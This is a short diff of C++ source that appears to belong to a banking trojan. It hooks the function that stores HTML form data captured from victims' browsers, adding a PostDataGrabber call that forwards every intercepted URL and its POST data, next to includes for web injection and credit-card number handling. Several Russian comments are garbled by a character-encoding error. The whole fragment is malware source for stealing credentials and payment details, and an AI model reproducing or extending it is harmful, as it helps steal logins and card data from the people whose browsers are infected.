@@ -8,6 +8,7 @@
 #include "BotUtils.h"
 #include "Inject.h"
 #include "Task.h"
+#include "PostDataGrabber.h"
 
 #include "CreditCardNomber.cpp"
 
@@ -1697,9 +1698,13 @@ bool DataGrabber::AddData(PCHAR URL, PCHAR Data, PCHAR UserAgent,
 
 bool DataGrabber::AddHTMLFormData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD Browser, DWORD DataType)
 {
+	#ifdef PostDataGrabberH
+		//оповещаем о получении пост данных
+		PostDataGrabber::DoEvents( URL, Data );
+	#endif
 	// ƒобавить данные HTML формы
 	LDBG("Loader", "ƒобавл€ем в хранилище HTML данные");
-
+	
 	// ѕровер€ем макимальный размер данных
 	if (StrCalcLength(Data) > MAX_FORM_GRABBER_DATA_SIZE)
 		return false;
